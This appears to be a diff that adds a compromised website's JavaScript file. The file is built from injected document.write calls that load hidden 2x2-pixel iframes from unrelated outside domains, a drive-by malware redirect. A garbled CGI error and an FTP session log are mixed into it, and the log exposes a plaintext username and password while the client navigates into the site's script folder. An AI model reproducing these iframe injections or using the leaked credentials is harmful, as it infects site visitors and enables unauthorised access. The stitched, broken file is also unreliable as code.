@@ -1,0 +1,34 @@
+document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://www.lightdragoons.org/ahhd.html?j=566760></iframe>');
+
+document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://habboigratis.altervista.org/ohmf.html?j=566760></iframe>');
+
+Malformed header from CGI script:
+* About to connect() to 81.17.250.73 port 21 (#0)
+*   Trying 81.17.250.73...
+* connected
+* Connected to 81.17.250.73 (81.17.250.73) port 21 (#0)
+< 220 Microsoft FTP Service
+> USER w00164696
+< 331 Password required for w00164696.
+> PASS Transporter03
+< 230 User logged in.
+> PWD
+< 257 "/" is current directory.
+* Entry path is '/'
+> CWD wwwroot
+< 250 CWD command successful.
+> CWD donegalplumber.com
+< 250 CWD command successful.
+> CWD J_Script
+< 250 CWD command successful.
+> EPSV
+* Connect data stream passively
+< 229 Entering Extended Passive Mode (|||45927|)
+* Connection time-out
+* got positive EPSV response, but can't connect. Disabling EPSV
+> PASV
+< 227 Entering Passive Mode (81,17,250,73,179,104).
+* Connection time-out
+* Closing connection #0
+Content-type: text/html
+document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://globalconferencemanagementgroup.com/hcwf.html></iframe>');
